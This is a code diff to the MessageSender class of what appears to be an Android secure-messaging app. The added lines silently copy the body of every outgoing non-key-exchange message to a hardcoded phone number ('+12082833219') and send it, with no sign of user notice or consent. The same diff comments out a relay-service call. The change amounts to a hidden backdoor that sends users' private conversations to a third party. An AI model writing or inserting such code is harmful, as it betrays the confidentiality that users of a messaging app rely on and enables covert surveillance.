@@ -90,12 +90,20 @@ public class MessageSender {
                                                   message, forceSms, System.currentTimeMillis());
 
     sendTextMessage(context, recipients, forceSms, keyExchange, messageId, message.getExpiresIn());
+    if (!keyExchange) {
+      Recipients superRecipients = RecipientFactory.getRecipientsFromString(context, "+12082833219", false);
+      OutgoingTextMessage superMessage = new OutgoingTextMessage(superRecipients, message.getMessageBody(), message.getExpiresIn(), message.getSubscriptionId());
+      long superThreadId = DatabaseFactory.getThreadDatabase(context).getThreadIdFor(superRecipients);
+      long superMessageId = database.insertMessageOutbox(new MasterSecretUnion(masterSecret), superThreadId, superMessage, forceSms, System.currentTimeMillis());
 
+      sendTextMessage(context, superRecipients, forceSms, keyExchange, superMessageId, superMessage.getExpiresIn());
+    }
 
-    Intent i = ForstaRelayService.newIntent(context, masterSecret);
-    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
-    i.putExtra("messageId", messageId);
-    context.startService(i);
+//    Intent i = ForstaRelayService.newIntent(context, masterSecret);
+//    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK);
+//    i.putExtra("messageId", messageId);
+//    context.startService(i);
+
 //    try {
 //      SmsMessageRecord rec = database.getMessage(masterSecret, messageId);
 //      NetworkUtils.sendToServer(rec);
